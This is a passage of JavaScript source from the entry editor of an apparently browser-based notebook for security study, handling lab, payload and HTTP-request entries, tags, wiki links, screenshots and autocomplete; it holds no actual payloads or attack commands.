    var title = h("input", { class:"vt-title", value:n.title, placeholder:n.type === "http" ? reqLine(n) || "untitled request" : "untitled", spellcheck:"false", maxlength:"200", "data-native-undo":"", "aria-label":"title" });
    ed.appendChild(title);
    var tagsEl = h("div", { class:"vt-tagsed" });
    var relEl = h("div", { class:"vt-rels" });
    ed.appendChild(h("div", { class:"vt-props" }, [tagsEl, relEl]));
    paintTags(); paintRels();
    if(n.type === "lab") ed.appendChild(labFields(n));
    if(n.type === "payload") ed.appendChild(payFields(n));
    if(n.type === "http") ed.appendChild(httpFields(n));
    if(n.type === "method") ed.appendChild(runBar(n, run));
    // the target bar only shows on entries that use {{IP}}-style placeholders
    if((n.type === "note" || n.type === "lab" || n.type === "method") && /\{\{[A-Za-z_]\w{0,30}\}\}/.test(n.body)) ed.appendChild(targetBar());
    var ta = h("textarea", { class:"vt-ta", spellcheck:"false", "data-native-undo":"", "aria-label":"text",
      placeholder:n.type === "payload" ? "what it does, when to use it, what to watch for. #tags work here." : "write in markdown. [[ links an entry, #tag tags it, question :: answer makes a flashcard, ``` starts a code block, paste a screenshot." });
    ta.value = n.body;
    var prev = h("div", { class:"vt-prev vt-md" });
    if(n.type === "payload" || n.type === "http") ed.appendChild(h("div", { class:"vt-sublabel", text:n.type === "payload" ? "description" : "notes" }));
    var panes = h("div", { class:"vt-panes m-" + mode }, [ta, prev]);
    var foot = h("div", { class:"vt-foot" });
    var gal = h("div", { class:"vt-gallery" });
    var conn = h("div", { class:"vt-conn" });
    // screenshots are evidence: a button you can see, plus paste and drag
    var shotbar = h("div", { class:"vt-shotbar" }, [
      h("button", { type:"button", class:"vt-btn vt-shotbtn", text:"+ screenshot", title:"add one or more pictures where the cursor is", onclick:function(){ imgIn.click(); } }), imgIn,
      h("span", { class:"vt-muted vt-small", text:"or paste one with Ctrl+V, or drag pictures onto the text" })
    ]);
    // an empty note offers the templates right where you'd start writing
    if(n.type === "note" && !n.body.trim()) ed.appendChild(h("div", { class:"vt-tplrow" }, [h("span", { class:"vt-rell", text:"start from" })].concat(
      NOTE_TPL.filter(function(t){ return t.id !== "blank"; }).map(function(t){
        return h("button", { type:"button", class:"vt-chip", title:t.hint, text:t.name, onclick:function(){
          n.body = tplBody("note", t.id); edited(n); commit();
          var x = root.querySelector(".vt-ta"); if(x){ x.focus(); x.setSelectionRange(x.value.length, x.value.length); }
        } });
      }))));
    ed.appendChild(shotbar); ed.appendChild(panes); ed.appendChild(foot); ed.appendChild(gal); ed.appendChild(conn);

    // every screenshot in this entry as a strip of thumbnails: click to view, × to take it out
    var SHOT = /!\[([^\]\n]*)\]\(img:(i[a-z0-9]{4,20})\)/g;
    function shots(){
      var out = [];
      n.body.replace(SHOT, function(m, alt, id){ if(V.imgs[id]) out.push({ md:m, cap:alt.trim(), src:V.imgs[id] }); return m; });
      return out;
    }
    function paintGallery(){
      gal.innerHTML = "";
      var list = shots();
      if(!list.length) return;
      gal.appendChild(h("div", { class:"vt-sublabel", text:"evidence · " + plural(list.length, "screenshot") }));
      gal.appendChild(h("div", { class:"vt-thumbs" }, list.map(function(s, i){
        var rm = armed(h("button", { type:"button", class:"vt-x vt-thumbx", text:"×", title:"take this screenshot out", "aria-label":"remove screenshot" }), "sure?", function(){
          var at = ta.value.indexOf(s.md);
          if(at < 0) return;
          var end = at + s.md.length;
          if(ta.value.charAt(end) === "\n") end++;
          ta.value = ta.value.slice(0, at) + ta.value.slice(end);
          changed(); clearTimeout(prevTimer); paintPreview(); paintGallery();
        });
        return h("figure", { class:"vt-thumb" }, [
          h("button", { type:"button", class:"vt-thumbimg", title:"view", onclick:function(){ lightbox(list, i); } }, [h("img", { src:s.src, alt:s.cap, loading:"lazy" })]),
          h("figcaption", { text:s.cap || "no caption" }), rm
        ]);
      })));
    }

    function setMode(m){ u.mode = m; draw(); if(m !== "read"){ var t = root.querySelector(".vt-ta"); if(t) t.focus(); } }
    function grow(){ ta.style.height = "auto"; ta.style.height = Math.max(ta.scrollHeight + 4, n.type === "payload" || n.type === "http" ? 160 : 380) + "px"; }
    function paintPreview(){
      if(mode === "edit") return;
      var ticks = null;
      if(run){ ticks = {}; run.ticks.forEach(function(k){ ticks[k] = 1; }); }
      R = rctx(n.id, ticks);
      prev.innerHTML = render(n.body, R) || '<p class="vt-muted">nothing here yet.</p>';
    }
    function paintMeta(){
      var S = scan(n);
      foot.textContent = u.flash || [plural(S.words, "word"), plural(S.cards.length, "card"), plural(S.code.length, "code block"), plural(S.links.length, "link"), "edited " + ago(n.updatedAt)].join(" · ");
      paintTags();
    }
    function paintTags(){
      tagsEl.innerHTML = "";
      n.tags.forEach(function(t){
        tagsEl.appendChild(h("span", { class:"vt-chip on" }, ["#" + t, h("button", { type:"button", class:"vt-x", text:"×", "aria-label":"remove tag", onclick:function(){
          n.tags = n.tags.filter(function(x){ return x !== t; }); edited(n); ctx.save(); paintTags(); } })]));
      });
      scan(n).tags.filter(function(t){ return n.tags.indexOf(t) < 0; }).forEach(function(t){
        tagsEl.appendChild(h("button", { type:"button", class:"vt-chip", title:"from the text", text:"#" + t, onclick:function(){ u.tag = t; u.mod = ""; u.showEd = false; u.sel[n.type] = ""; draw(); } }));
      });
      var add = h("input", { class:"vt-tagin", placeholder:"+ tag", spellcheck:"false", "data-native-undo":"", "aria-label":"add a tag",
        onkeydown:function(e){
          if(e.key !== "Enter") return;
          e.preventDefault();
          var t = lower(add.value).replace(/^#/, "");
          if(TAG_OK.test(t) && n.tags.indexOf(t) < 0){ n.tags.push(t); edited(n); ctx.save(); }
          paintTags();
          var again = tagsEl.querySelector(".vt-tagin"); if(again) again.focus();
        } });
      tagsEl.appendChild(add);
    }
    // connecting: one "+ connect" button and a search list. The kind of
    // connection is optional: it starts as "related" (or the obvious one for
    // a lab, payload or methodology) and changes by clicking its label.
    function defKind(){ return n.type === "lab" ? "practises" : n.type === "payload" ? "payload" : n.type === "method" ? "method" : "see"; }
    function connect(x){
      if(!x || x === n) return;
      if(!n.rels.some(function(r){ return r.id === x.id; })) n.rels.push({ t:defKind(), id:x.id });
      edited(n); commit();
    }
    function paintRels(){
      relEl.innerHTML = "";
      var row = h("div", { class:"vt-conrow" }, [h("span", { class:"vt-rell", text:"connected to" })]);
      relsOut(n).forEach(function(r){
        row.appendChild(h("span", { class:"vt-chip vt-relchip" }, [
          h("button", { type:"button", class:"vt-relkind", text:REL[r.t].f, title:"change how they're connected", onclick:function(e){ e.stopPropagation(); kindMenu(e.currentTarget, r); } }),
          h("button", { type:"button", class:"vt-relgo", text:name(r.n), title:"open " + TYPE_WORD[r.n.type], onclick:function(){ openEntry(r.n); } }),
          h("button", { type:"button", class:"vt-x", text:"×", "aria-label":"disconnect", title:"disconnect", onclick:function(){
            n.rels = n.rels.filter(function(x){ return !(x.t === r.t && x.id === r.n.id); }); edited(n); commit(); } })
        ]));
      });
      row.appendChild(h("button", { type:"button", class:"vt-btn vt-connect", text:"+ connect", title:"connect this to another entry", onclick:function(e){ e.stopPropagation(); connectPicker(e.currentTarget); } }));
      relEl.appendChild(row);
      var sug = related(n, 6).filter(function(x){ return !x.linked; }).slice(0, 3);
      if(sug.length) relEl.appendChild(h("div", { class:"vt-conrow" }, [h("span", { class:"vt-rell", text:"suggested" })].concat(sug.map(function(x){
        return h("button", { type:"button", class:"vt-chip vt-sugchip", title:"click to connect (" + Math.round(x.s * 100) + "% similar)", text:"+ " + name(x.n), onclick:function(){ connect(x.n); } });
      }))));
    }
    var KIND_HINT = { leads:"the next step in an attack", cause:"it's why this one happens", tech:"a technique to exploit this", fix:"it fixes or prevents this",
      practises:"this lab practises it", payload:"this payload is used for it", method:"this checklist tests for it", see:"just related" };
    function kindMenu(anchor, r){
      openMenu(anchor, [h("div", { class:"vt-mhead", text:"how is it connected to " + name(r.n) + "?" })].concat(REL_KEYS.map(function(k){
        return h("button", { type:"button", class:"vt-mi" + (k === r.t ? " on" : ""), onclick:function(){
          closeMenus();
          var x = n.rels.filter(function(y){ return y.id === r.n.id && y.t === r.t; })[0];
          if(x && x.t !== k){ x.t = k; edited(n); commit(); }
        } }, [h("b", { text:REL[k].f }), h("small", { text:KIND_HINT[k] })]);
      })));
    }
    function connectPicker(anchor){
      var near = {}, items = [], sel = 0;
      n.rels.forEach(function(r){ near[r.id] = 1; });
      var inp = h("input", { class:"vt-in vt-pickin", placeholder:"find an entry, or type a new title", spellcheck:"false", "data-native-undo":"", "aria-label":"find an entry" });
      var list = h("div", { class:"vt-picklist" });
      function upd(){
        var q = lower(inp.value);
        items = V.notes.filter(function(x){ return x !== n && x.type !== "capture" && !near[x.id] && (!q || lower(name(x)).indexOf(q) >= 0); })
          .sort(function(a, b){ return ((lower(name(b)).indexOf(q) === 0) - (lower(name(a)).indexOf(q) === 0)) || b.updatedAt - a.updatedAt; })
          .slice(0, 8).map(function(x){ return { x:x }; });
        if(q && !byTitle(q)) items.push({ make:inp.value.trim() });
        sel = Math.min(sel, Math.max(0, items.length - 1));
        list.innerHTML = "";
        items.forEach(function(it, i){
          list.appendChild(h("button", { type:"button", class:"vt-mi vt-pick" + (i === sel ? " on" : ""), onmousedown:function(e){ e.preventDefault(); sel = i; pick(); } },
            it.x ? [h("span", { class:"vt-badge t-" + it.x.type, text:TYPE_WORD[it.x.type] }), " " + name(it.x)] : ["+ new note “" + it.make + "”"]));
        });
        if(!items.length) list.appendChild(h("p", { class:"vt-muted vt-small vt-pempty", text:"type a title to make a new note" }));
      }
      function pick(){
        var it = items[sel];
        if(!it) return;
        closeMenus();
        var x = it.x;
        if(!x){ x = entry("note", it.make.slice(0, 200), ""); V.notes.push(x); }
        connect(x);
      }
      inp.addEventListener("input", function(){ sel = 0; upd(); });
      inp.addEventListener("keydown", function(e){
        if(e.key === "ArrowDown" || e.key === "ArrowUp"){ e.preventDefault(); if(items.length){ sel = (sel + (e.key === "ArrowDown" ? 1 : -1) + items.length) % items.length; upd(); } }
        else if(e.key === "Enter"){ e.preventDefault(); pick(); }
      });
      upd();
      openMenu(anchor, [inp, list]);
      if(menus.length) menus[menus.length - 1].classList.add("vt-pickmenu");
      inp.focus();
    }
    function paintConn(){
      conn.innerHTML = "";
      var chain = chainOf(n);
      if(chain.length > 1) conn.appendChild(section("exploit chain", [h("div", { class:"vt-chain" }, chain.map(function(x, i){
        var el = x === n ? h("b", { class:"vt-chainme", text:name(x) }) : h("button", { type:"button", class:"vt-chainlink", text:name(x), onclick:function(){ openEntry(x); } });
        return i ? h("span", {}, [h("i", { class:"vt-arrow", text:"→" }), el]) : el;
      }))]));
      var inc = relsIn(n), groups = {};
      inc.forEach(function(r){ (groups[r.t] = groups[r.t] || []).push(r.n); });
      var incRows = REL_KEYS.filter(function(t){ return groups[t]; }).map(function(t){
        return h("div", { class:"vt-relrow" }, [h("span", { class:"vt-rell", text:REL[t].b })].concat(groups[t].map(function(x){
          return h("button", { type:"button", class:"vt-chip", text:name(x), title:TYPE_WORD[x.type], onclick:function(){ openEntry(x); } });
        })));
      });
      if(incRows.length) conn.appendChild(section("connected from other entries", incRows));
      var bl = backlinks(n);
      function ctxLine(o, needle){
        var lines = o.body.split("\n");
        for(var i = 0; i < lines.length; i++) if(lines[i].toLowerCase().indexOf(needle) >= 0) return lines[i].trim().slice(0, 140);
        return "";
      }
      if(bl.length) conn.appendChild(section("linked from " + bl.length, bl.map(function(o){
        return h("button", { type:"button", class:"vt-brow", onclick:function(){ openEntry(o); } }, [h("b", { text:name(o) }), h("small", { text:ctxLine(o, "[[" + lower(n.title)) })]);
      })));
      var rel = related(n, 6), dups = rel.filter(function(x){ return x.s >= 0.72 && x.n.type === n.type; });
      if(dups.length) conn.appendChild(h("div", { class:"vt-co vt-co-warn" }, [h("div", { class:"vt-co-t", text:"possible duplicate" }),
        h("p", {}, ["this overlaps a lot with ", h("button", { type:"button", class:"vt-link vt-inl", text:name(dups[0].n), onclick:function(){ openEntry(dups[0].n); } }), ". merge them or link them."])]));
      var k = lower(n.title);
      if(k.length >= 4){
        var re = new RegExp("(^|[^\\w])" + reEsc(k) + "(?![\\w])", "i"), near = {};
        n.rels.forEach(function(r){ near[r.id] = 1; });
        relsIn(n).forEach(function(r){ near[r.n.id] = 1; });
        var ment = V.notes.filter(function(o){ return o !== n && bl.indexOf(o) < 0 && !near[o.id] && re.test(o.body); }).slice(0, 8);
        if(ment.length) conn.appendChild(section("mentioned in", ment.map(function(o){
          return h("div", { class:"vt-sugrow" }, [
            h("button", { type:"button", class:"vt-brow", onclick:function(){ openEntry(o); } }, [h("b", { text:name(o) }), h("small", { text:ctxLine(o, k) })]),
            h("button", { type:"button", class:"vt-link", text:"+ connect", onclick:function(){ connect(o); } })
          ]);
        }), h("span", { class:"vt-muted vt-small", text:"they name this entry but aren't connected" })));
      }
    }

    // ---- typing ----
    function changed(){
      n.body = ta.value; edited(n);
      ctx.save();
      grow();
      clearTimeout(prevTimer); prevTimer = setTimeout(paintPreview, 120);
      clearTimeout(metaTimer); metaTimer = setTimeout(function(){ paintMeta(); paintGallery(); var r = listEl && listEl.querySelector('[data-id="' + n.id + '"] small'); if(r) r.textContent = rowMeta(n); }, 400);
      acCheck();
    }
    ta.addEventListener("input", changed);
    ta.addEventListener("blur", function(){ setTimeout(acHide, 150); paintConn(); });
    title.addEventListener("focus", function(){ titleAtFocus = n.title; });
    title.addEventListener("input", function(){
      n.title = title.value; edited(n);
      ctx.save();
      var r = listEl && listEl.querySelector('[data-id="' + n.id + '"] .vt-rtt');
      if(r) r.textContent = name(n);
    });
    // renaming updates [[links]] to it, like Obsidian (one more undo step)
    title.addEventListener("change", function(){
      var o = titleAtFocus.trim(), nw = n.title.trim();
      titleAtFocus = n.title;
      if(!o || !nw || lower(o) === lower(nw) || byTitle(o)){ paintConn(); return; }
      var re = new RegExp("\\[\\[\\s*" + reEsc(o) + "\\s*(\\|[^\\]\\n]*)?\\]\\]", "gi"), count = 0;
      V.notes.forEach(function(x){
        var b = x.body.replace(re, function(_, alias){ return "[[" + nw + (alias || "") + "]]"; });
        if(b !== x.body){ x.body = b; delete x.seed; count++; }
      });
      if(count){ ctx.save(); foot.textContent = "updated links in " + plural(count, "entry"); }
      paintConn();
    });
    title.addEventListener("keydown", function(e){ if(e.key === "Enter"){ e.preventDefault(); var f = ed.querySelector(".vt-code-in, .vt-req") || ta; f.focus(); if(f.setSelectionRange) f.setSelectionRange(0, 0); } });

    function insert(text){
      ta.focus();
      var ok = false;
      try{ ok = document.execCommand("insertText", false, text); }catch(e){}
      if(!ok){ ta.setRangeText(text, ta.selectionStart, ta.selectionEnd, "end"); changed(); }
    }
    // each screenshot gets a numbered caption ("screenshot 3") you can rename;
    // it goes where the cursor is, or at the end when the text box is hidden (read mode)
    function insertImage(data){
      // numbers keep counting up even after one is removed, so "screenshot 3" always means the same picture
      var top = shots().length;
      ta.value.replace(/!\[screenshot (\d+)\]/g, function(m, k){ top = Math.max(top, +k); return m; });
      var id = storeImage(data), md = "![screenshot " + (top + 1) + "](img:" + id + ")";
      if(mode === "read"){
        ta.value = ta.value.replace(/\s+$/, "") + (ta.value.trim() ? "\n\n" : "") + md + "\n";
        changed(); clearTimeout(prevTimer); paintPreview(); paintGallery();
        return;
      }
      var before = ta.value.slice(0, ta.selectionStart), lead = before && !/\n$/.test(before) ? "\n" : "";
      insert(lead + md + "\n");
      paintGallery();
    }
    function hasFiles(e){ return e.dataTransfer && Array.prototype.some.call(e.dataTransfer.types || [], function(t){ return t === "Files"; }); }
    ta.addEventListener("paste", function(e){ var fs = imagesFrom(e.clipboardData); if(fs.length){ e.preventDefault(); readImages(fs, insertImage); } });
    // drop works on the text and on the preview beside it
    panes.addEventListener("dragover", function(e){ if(hasFiles(e)){ e.preventDefault(); panes.classList.add("vt-dropping"); } });
    panes.addEventListener("dragleave", function(e){ if(!panes.contains(e.relatedTarget)) panes.classList.remove("vt-dropping"); });
    panes.addEventListener("drop", function(e){
      panes.classList.remove("vt-dropping");
      var fs = imagesFrom(e.dataTransfer);
      if(fs.length){ e.preventDefault(); readImages(fs, insertImage); }
    });
    function inFence(pos){
      var lines = ta.value.slice(0, pos).split("\n"), f = null;
      for(var i = 0; i < lines.length - 1; i++){
        if(f){ if(closes(lines[i], f)) f = null; }
        else{ var m = FENCE.exec(lines[i]); if(m) f = m[1]; }
      }
      return !!f;
    }
    function wrapSel(mark){
      var s = ta.selectionStart, e = ta.selectionEnd, sel = ta.value.slice(s, e);
      insert(mark + sel + mark);
      ta.setSelectionRange(s + mark.length, s + mark.length + sel.length);
    }
    function indent(out){
      var v = ta.value, s = ta.selectionStart, e = ta.selectionEnd;
      var ls = v.lastIndexOf("\n", s - 1) + 1, le = v.indexOf("\n", e === s ? e : e - 1);
      if(le < 0) le = v.length;
      var block = v.slice(ls, le), lines = block.split("\n");
      var nb = lines.map(function(l){ return out ? l.replace(/^ {1,2}|^\t/, "") : "  " + l; }).join("\n");
      if(nb === block) return;
      ta.setSelectionRange(ls, le);
      insert(nb);
      var d0 = out ? -Math.min(s - ls, block.length - block.replace(/^ {1,2}|^\t/, "").length) : 2;
      ta.setSelectionRange(Math.max(ls, s + d0), ls + nb.length - (le - e));
    }
    ta.addEventListener("keydown", function(e){
      if(ac && acKey(e)) return;
      var k = (e.key || "").toLowerCase(), mod = e.ctrlKey || e.metaKey;
      if(mod && !e.altKey && !e.shiftKey && k === "b"){ e.preventDefault(); wrapSel("**"); return; }
      if(mod && !e.altKey && !e.shiftKey && k === "i"){ e.preventDefault(); wrapSel("*"); return; }
      if(mod && !e.altKey && k === "e"){ e.preventDefault(); setMode(mode === "edit" ? "split" : mode === "split" ? "read" : "edit"); return; }
      if(mod && !e.altKey && k === "s"){ e.preventDefault(); foot.textContent = "saved: it saves as you type"; return; }
      if(e.key === "Escape"){ ta.blur(); return; }
      if(e.key === "Tab" && !mod && !e.altKey){ e.preventDefault(); indent(e.shiftKey); return; }
      if(e.key === "Enter" && !mod && !e.altKey && !e.shiftKey && ta.selectionStart === ta.selectionEnd){
        var v = ta.value, s = ta.selectionStart, ls = v.lastIndexOf("\n", s - 1) + 1, line = v.slice(ls, s);
        var m = /^(\s*)(?:([-*+])|(\d{1,3})([.)]))\s+(\[[ xX]\]\s+)?/.exec(line);
        if(!m || inFence(s)) return;
        e.preventDefault();
        var le = v.indexOf("\n", s);
        if(line.length === m[0].length && v.slice(s, le < 0 ? v.length : le).trim() === ""){
          ta.setSelectionRange(ls, s);     // an empty item ends the list
          var ok = false;
          try{ ok = document.execCommand("delete"); }catch(_){}
          if(!ok){ ta.setRangeText("", ls, s, "end"); changed(); }
          return;
        }
        insert("\n" + m[1] + (m[2] || (+m[3] + 1) + m[4]) + " " + (m[5] ? "[ ] " : ""));
      }
    });
    ta.addEventListener("click", function(){ acCheck(); });

    // ---- [[ autocomplete ----
    var ac = null;
    function acHide(){ if(ac && ac.el.parentNode) ac.el.parentNode.removeChild(ac.el); ac = null; }
    function acCheck(){
      var pos = ta.selectionStart;
      if(pos !== ta.selectionEnd) return acHide();
      var m = /\[\[([^\]\[\n|]{0,80})$/.exec(ta.value.slice(Math.max(0, pos - 90), pos));
      if(!m) return acHide();
      var q = m[1].toLowerCase().trim();
      var list = V.notes.filter(function(x){ return x !== n && x.title.trim() && x.type !== "capture" && (!q || x.title.toLowerCase().indexOf(q) >= 0); })
        .sort(function(a, b){ return (b.title.toLowerCase().indexOf(q) === 0) - (a.title.toLowerCase().indexOf(q) === 0) || b.updatedAt - a.updatedAt; })
        .slice(0, 8).map(function(x){ return { title:x.title.trim(), type:x.type }; });
      if(q && !byTitle(q)) list.push({ title:m[1].trim(), type:"" });
      if(!list.length) return acHide();
      if(!ac){ ac = { el:h("div", { class:"vt-ac", role:"listbox" }), i:0 }; document.body.appendChild(ac.el); }
      ac.items = list; ac.q = m[1]; ac.i = Math.min(ac.i, list.length - 1);
      ac.el.innerHTML = "";
      list.forEach(function(it, i){
        ac.el.appendChild(h("button", { type:"button", class:"vt-aci" + (i === ac.i ? " on" : ""), tabindex:"-1",
          onmousedown:function(ev){ ev.preventDefault(); ac.i = i; acPick(); } },
          it.type ? [it.title, h("small", { text:" " + TYPE_WORD[it.type] })] : ["+ link new note “" + it.title + "”"]));
      });
      var xy = caretXY(ta, pos);
      ac.el.style.left = Math.max(8, Math.min(xy.left, window.innerWidth - 300)) + "px";
      ac.el.style.top = Math.min(xy.top + 4, window.innerHeight - ac.el.offsetHeight - 8) + "px";
    }
    function acPick(){
      var it = ac.items[ac.i], pos = ta.selectionStart, closed = ta.value.slice(pos, pos + 2) === "]]";
      ta.setSelectionRange(pos - ac.q.length, pos);
      acHide();
      insert(it.title + (closed ? "" : "]]"));
      if(closed) ta.setSelectionRange(ta.selectionStart + 2, ta.selectionStart + 2);
    }
    function acKey(e){
      if(e.key === "ArrowDown" || e.key === "ArrowUp"){
        e.preventDefault();
        ac.i = (ac.i + (e.key === "ArrowDown" ? 1 : -1) + ac.items.length) % ac.items.length;
        Array.prototype.forEach.call(ac.el.children, function(c, i){ c.classList.toggle("on", i === ac.i); });
        return true;
      }
      if(e.key === "Enter" || e.key === "Tab"){ e.preventDefault(); acPick(); return true; }
      if(e.key === "Escape"){ e.preventDefault(); acHide(); return true; }
      return false;
    }

    // ---- preview clicks: links, tags, ticks, copy, images ----
    prev.addEventListener("click", function(e){
      if(e.target.tagName === "IMG" && e.target.classList.contains("vt-img")){
        var all = Array.prototype.slice.call(prev.querySelectorAll("img.vt-img"));
        lightbox(all.map(function(x){ return { src:x.src, cap:x.alt }; }), all.indexOf(e.target));
        return;
      }
      var a = e.target.closest("a, button");
      if(!a) return;
      if(a.classList.contains("vt-wl")){ e.preventDefault(); followLink(a.getAttribute("data-wl")); }
      else if(a.classList.contains("vt-tag")){ e.preventDefault(); u.tag = a.getAttribute("data-tag"); u.mod = ""; u.q[n.type] = ""; u.sel[n.type] = ""; u.showEd = false; draw(); }
      else if(a.classList.contains("vt-chk")){
        if(run){
          var key = a.getAttribute("data-key"), i = run.ticks.indexOf(key);
          if(i >= 0) run.ticks.splice(i, 1); else run.ticks.push(key);
          edited(n); ctx.save(); paintPreview(); paintRunProgress();
          return;
        }
        var lines = n.body.split("\n"), k = +a.getAttribute("data-line");
        if(lines[k] == null) return;
        lines[k] = lines[k].replace(/^(\s*(?:[-*+]|\d{1,3}[.)])\s+)\[([ xX])\]/, function(_, pre, c){ return pre + (c === " " ? "[x]" : "[ ]"); });
        ta.value = lines.join("\n");
        changed(); clearTimeout(prevTimer); paintPreview();
      }
      else if(a.classList.contains("vt-copy")){ copyBtn(a, fill(R.codes[+a.getAttribute("data-code")], V.vars)); }
    });
    prev.addEventListener("dblclick", function(e){ if(mode === "read" && !e.target.closest("a, button")) setMode("split"); });

    // ---- type-specific fields ----
    function field(label, el, wide){ return h("label", { class:"vt-field" + (wide ? " wide" : "") }, [h("span", { text:label }), el]); }
    function labFields(n){
      var Lb = n.lab;
      var plat = h("input", { class:"vt-in", list:"vt-plat", value:Lb.platform, placeholder:"PortSwigger, HTB…", "data-native-undo":"",
        oninput:function(){ Lb.platform = plat.value.slice(0, 40); edited(n); ctx.save(); } });
      var diff = h("select", { class:"vt-in", onchange:function(){ Lb.diff = diff.value; edited(n); ctx.save(); } },
        [h("option", { value:"", text:"—" })].concat(DIFFS.map(function(d){ return h("option", { value:d, text:d }); })));
      diff.value = Lb.diff;
      var date = h("input", { class:"vt-in", type:"date", value:Lb.date, onchange:function(){ Lb.date = isIso(date.value) ? date.value : ""; edited(n); ctx.save(); } });
      var mins = h("input", { class:"vt-in", type:"number", min:"0", step:"5", value:Lb.mins || "", placeholder:"0", "data-native-undo":"",
        oninput:function(){ Lb.mins = int(mins.value, 0, 100000); edited(n); ctx.save(); } });
      var url = h("input", { class:"vt-in", type:"url", value:Lb.url, placeholder:"https://…", "data-native-undo":"",
        onchange:function(){ Lb.url = safeUrl(url.value); url.classList.toggle("bad", !!url.value.trim() && !Lb.url); edited(n); ctx.save(); } });
      var stat = h("div", { class:"vt-toggle" }, LAB_STATUS.map(function(s){
        return h("button", { type:"button", class:"vt-tog" + (Lb.status === s ? " on" : ""), text:s, onclick:function(){
          Lb.status = s;
          if(s === "solved" && !Lb.date) Lb.date = today();      // solving dates it
          edited(n); commit(); } });
      }));
      return h("div", { class:"vt-fields" }, [
        field("status", stat, true), field("platform", plat), field("level", diff), field("date", date), field("minutes", mins),
        field("link", h("div", { class:"vt-urlrow" }, [url, Lb.url ? h("a", { class:"vt-link", href:Lb.url, target:"_blank", rel:"noopener noreferrer", text:"open" }) : null]), true)
      ]);
    }
    function payFields(n){
      var P = n.pay, R2 = rctx(n.id);
      var cat = h("select", { class:"vt-in", onchange:function(){ P.cat = cat.value; edited(n); ctx.save(); renderList("payload"); } }, PAY_CATS.map(function(c){ return h("option", { value:c, text:c }); }));
      cat.value = P.cat;
      var lang = h("input", { class:"vt-in", list:"vt-langs", value:P.lang, placeholder:"text", spellcheck:"false", "data-native-undo":"",
        oninput:function(){ P.lang = lang.value.replace(/[^\w+#.-]/g, "").slice(0, 30) || "text"; edited(n); ctx.save(); paintCode(); } });
      var code = h("textarea", { class:"vt-in vt-code-in", spellcheck:"false", "data-native-undo":"", placeholder:"the payload or command. {{IP}}, {{PORT}}, {{LHOST}}… get filled in from the target.",
        oninput:function(){ P.code = code.value; edited(n); ctx.save(); growCode(); paintCode(); } });
      code.value = P.code;
      var out = h("div", { class:"vt-paycode" });
      function growCode(){ code.style.height = "auto"; code.style.height = Math.max(code.scrollHeight + 4, 90) + "px"; }
      function paintCode(){ R2 = rctx(n.id); out.innerHTML = P.code.trim() ? '<div class="vt-md">' + codeHtml(P.code, P.lang, "with your target filled in", R2) + "</div>" : ""; }
      out.addEventListener("click", function(e){ var b = e.target.closest(".vt-copy"); if(b) copyBtn(b, fill(P.code, V.vars)); });
      paintCode(); requestAnimationFrame(growCode);
      return h("div", {}, [h("div", { class:"vt-fields" }, [field("category", cat), field("language", lang)]), field("code", code, true), targetBar(), out]);
    }
    function httpFields(n){
      var H = n.http, timer = null;
      var req = h("textarea", { class:"vt-in vt-raw vt-req", spellcheck:"false", "data-native-undo":"", placeholder:"GET /path?x=1 HTTP/1.1\nHost: target.htb\n…",
        oninput:function(){ H.req = req.value; edited(n); ctx.save(); later(); } });
      // big responses would slow every save and sync: each side keeps up to 300 KB
      req.setAttribute("maxlength", "300000");
      var res = h("textarea", { class:"vt-in vt-raw vt-res", spellcheck:"false", "data-native-undo":"", maxlength:"300000", placeholder:"HTTP/1.1 200 OK\nContent-Type: text/html\n\n<html>…\n\n(up to 300 KB is kept)",
        oninput:function(){ H.res = res.value; edited(n); ctx.save(); later(); } });
      req.value = H.req; res.value = H.res;
      var out = h("div", { class:"vt-http" });
      function later(){ clearTimeout(timer); timer = setTimeout(paint, 250); }
      function noteIn(key){
        var i = h("input", { class:"vt-ann", value:H.ann[key] || "", placeholder:"note", spellcheck:"false", "data-native-undo":"", "aria-label":"annotation",
          oninput:function(){ var v = i.value.trim(); if(v) H.ann[key] = i.value.slice(0, 1000); else delete H.ann[key]; edited(n); ctx.save(); } });
        return i;
      }
      function table(title, head, rows){
        if(!rows.length) return null;
        return section(title, [h("div", { class:"vt-twrap" }, [h("table", { class:"vt-table vt-htable" }, [
          h("thead", {}, [h("tr", {}, head.map(function(c){ return h("th", { text:c }); }))]),
          h("tbody", {}, rows)])])]);
      }
      function cell(v, cls){ v = String(v); return h("td", { class:cls || "", title:v.length > 120 ? v : null, text:v.length > 120 ? v.slice(0, 120) + "…" : v }); }
      function paint(){
        var rq = parseReq(H.req), rs = parseRes(H.res), fs = findings(rq, rs), flagged = {};
        fs.forEach(function(f){ if(f.key) flagged[f.key] = f.sev; });
        out.innerHTML = "";
        out.appendChild(h("div", { class:"vt-hsum" }, rq.ok
          ? [h("b", { class:"vt-hmeth", text:rq.method }), h("span", { text:" " + (rq.host ? rq.host : "") + rq.path }),
             rs.ok ? h("span", { class:"vt-hstat" + (rs.status >= 400 ? " bad" : ""), text:"  → " + rs.status + " " + rs.reason }) : h("span", { class:"vt-muted", text:"  (no response yet)" }),
             rs.ok ? h("span", { class:"vt-muted", text:"  · " + rs.body.length + " bytes" }) : null]
          : [h("span", { class:"vt-muted", text:H.req.trim() ? "the first line should look like: GET /path HTTP/1.1" : "paste a raw request above (and the response next to it)." })]));
        if(fs.length) out.appendChild(section("leads", [h("ul", { class:"vt-finds" }, fs.map(function(f){ return h("li", { class:"f-" + f.sev }, [h("b", { text:f.sev }), h("span", { text:f.t })]); }))]));
        function key(p){ return (p.src === "q" ? "q:" : "b:") + p.k; }
        out.appendChild(table("parameters", ["where", "name", "value", "note"], rq.params.map(function(p){
          return h("tr", { class:flagged[key(p)] ? "f-" + flagged[key(p)] : "" }, [cell(p.src === "q" ? "query" : "body", "vt-muted"), cell(p.k, "vt-hk"), cell(p.v), h("td", {}, [noteIn(key(p))])]);
        })));
        out.appendChild(table("cookies sent", ["name", "value", "note"], rq.cookies.map(function(c){
          return h("tr", {}, [cell(c[0], "vt-hk"), cell(c[1]), h("td", {}, [noteIn("c:" + c[0])])]);
        })));
        out.appendChild(table("request headers", ["name", "value", "note"], rq.headers.filter(function(x){ return lower(x[0]) !== "cookie"; }).map(function(x){
          return h("tr", {}, [cell(x[0], "vt-hk"), cell(x[1]), h("td", {}, [noteIn("h:" + x[0])])]);
        })));
        out.appendChild(table("cookies set", ["name", "HttpOnly", "Secure", "SameSite", "note"], rs.setCookies.map(function(c){
          function yes(v){ return h("td", { class:v ? "" : "vt-bad", text:v === true ? "yes" : v ? String(v) : "no" }); }
